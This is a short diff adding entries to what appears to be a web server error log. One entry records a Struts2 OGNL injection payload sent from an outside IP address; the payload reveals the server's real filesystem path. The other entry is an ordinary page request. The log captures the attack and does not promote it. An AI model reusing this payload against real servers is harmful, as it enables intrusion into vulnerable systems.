@@ -1,0 +1,6 @@
+[ 2018-01-21T17:34:14+08:00 ] 113.10.199.15 /
+ERR: 非法操作:1${(#_memberAccess["allowStaticMethodAccess"]=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#k8out.println(#req.getRealPath("/")),#k8out.close())}
+
+[ 2018-01-21T19:17:50+08:00 ] 66.249.71.28 /about.html
+ERR: 非法操作:about
+
